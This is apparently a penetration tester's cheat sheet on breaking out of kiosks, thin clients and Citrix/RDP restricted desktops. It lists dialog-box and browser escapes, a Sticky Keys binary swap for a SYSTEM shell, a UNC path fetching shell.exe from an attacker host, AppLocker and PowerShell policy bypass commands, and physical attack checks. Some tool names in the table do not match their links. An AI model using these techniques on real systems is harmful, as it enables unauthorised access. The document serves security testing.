# Thin Client & Kiosk Testing

> Breaking out of locked-down environments: thin clients, kiosk browsers, citrix, RDP restricted desktops.

---

## Common Targets

- ATM / POS terminal kiosks
- Airport / hotel self-service kiosks
- Library public terminals
- Citrix/RDP thin clients
- Locked-down Windows desktops (Group Policy)
- Browser-only environments

---

## Breakout Techniques

### Via Dialog Boxes
```
File → Save As / Open → address bar → type path → shell access
Print dialog → browse → UNC path or cmd.exe
Help menu → "Search" → browser → navigate to cmd

Right-click → Properties → "Open file location"
Ctrl+O in any application → file browser → navigate
```

### Via Sticky Keys / Accessibility
```
Press Shift 5 times → sethc.exe replaced with cmd.exe (on unpatched):
  Check: C:\Windows\System32\sethc.exe
  Replace method: boot from external media, rename sethc.exe → sethc.bak,
                  copy cmd.exe → sethc.exe
  Trigger: Shift x5 at login screen → SYSTEM cmd.exe

Other binaries to replace: Magnify.exe, Narrator.exe, OSK.exe
```

### Via Task Manager
```
Ctrl+Shift+Esc → Task Manager
File → Run New Task → cmd.exe or powershell.exe
(may be blocked: try explorer.exe then navigate)
```

### Via Browser (if one is accessible)
```bash
# Navigate to:
file:///C:/Windows/System32/cmd.exe
file:///C:/Windows/System32/

# UNC paths (if network access)
\\attacker-ip\share\shell.exe

# javascript: in address bar
javascript:void(window.open("file:///C:/Windows/System32/cmd.exe"))
```

### Via Office Applications
```
Word/Excel → Insert → Object → Browse → cmd.exe
Word → Macro (if not disabled): Sub Auto_Open() Shell "cmd.exe" End Sub
Excel → Name Box → type: C:\Windows\System32\cmd.exe
```

---

## Citrix / RDP Breakout

```bash
# Citrix ICA published apps: breakout through app
# 1. Open any file dialog
# 2. Navigate to C:\Windows\System32\
# 3. Run cmd.exe

# Citrix receiver: local resource mapping
# Map local drives → client→server file copy possible

# Process injection into allowed process
# Allowed: notepad.exe
# Inject cmd.exe into notepad.exe process

# Seamless mode bypass
# Some published apps have keyboard shortcut access to taskbar
```

---

## Group Policy Bypass

```bash
# Identify GPO restrictions
gpresult /r                          # current GPO summary
gpresult /h gpo_report.html          # full HTML report

# AppLocker bypass: whitelisted paths
C:\Windows\Tasks\              # often writable + executable
C:\Windows\System32\spool\drivers\color\
%TEMP%\                        # check if scripts allowed

# Common bypasses
# InstallUtil: execute arbitrary code via .NET
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

# Regsvcs/Regasm: similar to InstallUtil
# MSBuild: build file can contain inline code
# PowerShell execution policy bypass:
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -EncodedCommand <base64>
```

---

## Physical Security Checks

```
□ USB ports available? → USB boot possible?
□ PS/2 keyboard? → keylogger installation
□ Network port exposed? → direct LAN access
□ BIOS password set? → boot order modifiable?
□ Full disk encryption? → cold boot attack on RAM
□ Tamper-evident labels? → hardware implant detection
□ Screen timeout? → session hijacking window
□ Printer attached? → driver installation vector
```

---

## Tools

| Tool | Purpose |
|------|---------|
| [Citrix_enum](https://github.com/0xbadjuju/Tokenvator) | Token manipulation post-breakout |
| [AppLocker Policy Dumper](https://github.com/api0cradle/UltimateAppLockerByPassList) | AppLocker bypass list |
| [UACME](https://github.com/hfiref0x/UACME) | UAC bypass collection |
| [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | PowerShell post-exploitation |
